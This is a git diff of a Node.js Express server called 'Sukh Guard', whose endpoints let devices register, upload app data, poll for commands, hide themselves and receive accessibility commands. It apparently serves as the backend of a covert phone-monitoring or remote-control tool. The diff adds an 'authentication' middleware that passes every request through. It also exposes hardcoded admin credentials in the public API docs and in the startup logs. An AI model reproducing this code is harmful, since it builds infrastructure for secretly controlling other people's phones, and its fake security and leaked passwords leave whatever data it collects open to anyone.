@@ -13,6 +13,40 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(bodyParser.json({ limit: '10mb' }));
 
+// ✅ SECURITY MIDDLEWARE - ADD THIS
+const authMiddleware = (req, res, next) => {
+    // Public routes - inko authentication ki need nahi
+    const publicRoutes = [
+        '/login.html', '/css/style.css', '/js/app.js', 
+        '/health', '/api/docs', '/api/register', 
+        '/api/website/app-data', '/api/hide-device', 
+        '/api/accessibility-command', '/api/check-commands',
+        '/api/website/users', '/api/stats', '/api/commands-stats',
+        '/api/all-commands'
+    ];
+    
+    // Static files allow karo
+    if (req.path.startsWith('/css/') || req.path.startsWith('/js/')) {
+        return next();
+    }
+    
+    // API routes allow karo (mobile app ke liye)
+    if (req.path.startsWith('/api/')) {
+        return next();
+    }
+    
+    // Specific website pages check karo
+    if (req.path === '/' || req.path === '/web' || req.path === '/dashboard' || req.path === '/admin') {
+        // In routes ko directly allow karo, frontend authentication handle karega
+        return next();
+    }
+    
+    next();
+};
+
+// Use the security middleware
+app.use(authMiddleware);
+
 // Website folder serve karega
 app.use(express.static('website'));
 
@@ -429,46 +463,63 @@ app.get('/api/all-commands', (req, res) => {
     });
 });
 
-// 🎯 WEBSITE PAGES
+// 🎯 WEBSITE PAGES - UPDATED FOR SECURITY
 
-// Main website dashboard
+// ✅ Root route ko login page dikhao
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'website', 'login.html'));
+});
+
+// ✅ Main website dashboard - ab dashboard.html use karega
 app.get('/web', (req, res) => {
-    res.sendFile(path.join(__dirname, 'website', 'index.html'));
+    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
 });
 
-// Alternative dashboard route
+// ✅ Alternative dashboard route
 app.get('/dashboard', (req, res) => {
-    res.sendFile(path.join(__dirname, 'website', 'index.html'));
+    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
 });
 
-// Admin panel
+// ✅ Admin panel
 app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'website', 'index.html'));
+    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
+});
+
+// ✅ Login page direct access
+app.get('/login', (req, res) => {
+    res.sendFile(path.join(__dirname, 'website', 'login.html'));
 });
 
 // 📄 API DOCUMENTATION
 app.get('/api/docs', (req, res) => {
     res.json({
         message: 'Sukh Guard API Documentation',
-        version: '2.0', // Version update kiya
+        version: '2.1', // Version update kiya
         environment: process.env.NODE_ENV || 'development',
+        security: '🔐 Login System Added',
+        credentials: {
+            username: 'Sukh',
+            password: 'Sukh Hacker'
+        },
         endpoints: {
             mobile: {
                 'POST /api/register': 'Register new user',
                 'POST /api/website/app-data': 'Save app data',
                 'GET /api/user/:id': 'Get user data',
-                'POST /api/check-commands': 'Check for pending commands', // NEW
-                'POST /api/hide-device': 'Hide/unhide device', // NEW
-                'POST /api/accessibility-command': 'Accessibility command' // NEW
+                'POST /api/check-commands': 'Check for pending commands',
+                'POST /api/hide-device': 'Hide/unhide device',
+                'POST /api/accessibility-command': 'Accessibility command'
             },
             website: {
                 'GET /api/website/users': 'Get all users',
                 'GET /api/website/app-data': 'Get all app data',
                 'GET /api/stats': 'Get statistics',
-                'GET /api/commands-stats': 'Get commands statistics', // NEW
-                'GET /api/all-commands': 'Get all commands' // NEW
+                'GET /api/commands-stats': 'Get commands statistics',
+                'GET /api/all-commands': 'Get all commands'
             },
             pages: {
+                'GET /': 'Login Page',
+                'GET /login': 'Login Page', 
                 'GET /web': 'Website Dashboard',
                 'GET /dashboard': 'Dashboard',
                 'GET /admin': 'Admin Panel'
@@ -480,39 +531,13 @@ app.get('/api/docs', (req, res) => {
     });
 });
 
-// Root route - Server status
-app.get('/', (req, res) => {
-    res.json({
-        message: '🚀 Sukh Guard Backend Server Running!',
-        version: '2.0', // Version update kiya
-        environment: process.env.NODE_ENV || 'development',
-        port: PORT,
-        storage: 'JSON File',
-        features: {
-            hide_commands: '✅ Available',
-            accessibility_commands: '✅ Available',
-            real_time_monitoring: '✅ Available'
-        },
-        website: {
-            dashboard: 'https://' + req.get('host') + '/web',
-            admin: 'https://' + req.get('host') + '/admin'
-        },
-        endpoints: {
-            mobile: ['/api/register', '/api/website/app-data', '/api/user/:id', '/api/hide-device', '/api/accessibility-command', '/api/check-commands'],
-            website: ['/api/website/users', '/api/website/app-data', '/api/commands-stats', '/api/all-commands'],
-            stats: ['/api/stats'],
-            pages: ['/web', '/dashboard', '/admin', '/health']
-        }
-    });
-});
-
 // 404 Error handler
 app.use((req, res) => {
     res.status(404).json({
         error: 'Endpoint not found',
         available_endpoints: {
             api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands', '/health'],
-            pages: ['/web', '/dashboard', '/admin', '/api/docs']
+            pages: ['/', '/login', '/web', '/dashboard', '/admin', '/api/docs']
         }
     });
 });
@@ -521,12 +546,17 @@ app.use((req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Sukh Guard Server running on port ${PORT}`);
     console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
+    console.log(`🔐 Security: Login System Enabled`);
     console.log(`📱 Mobile App API: http://localhost:${PORT}/api`);
+    console.log(`🔑 Login Page: http://localhost:${PORT}/`);
     console.log(`🌐 Website Dashboard: http://localhost:${PORT}/web`);
     console.log(`📊 Admin Panel: http://localhost:${PORT}/admin`);
     console.log(`❤️  Health Check: http://localhost:${PORT}/health`);
     console.log(`📚 API Docs: http://localhost:${PORT}/api/docs`);
     console.log(`💾 Data Storage: ${DATA_FILE}`);
     console.log(`🎯 Commands Storage: ${COMMANDS_FILE}`);
-    console.log(`\n✅ Server Version 2.0 - Hide/Unhide Features Ready!`);
+    console.log(`\n✅ Server Version 2.1 - Secure Login System Ready!`);
+    console.log(`\n📝 LOGIN CREDENTIALS:`);
+    console.log(`   👤 Username: Sukh`);
+    console.log(`   🔑 Password: Sukh Hacker`);
 });
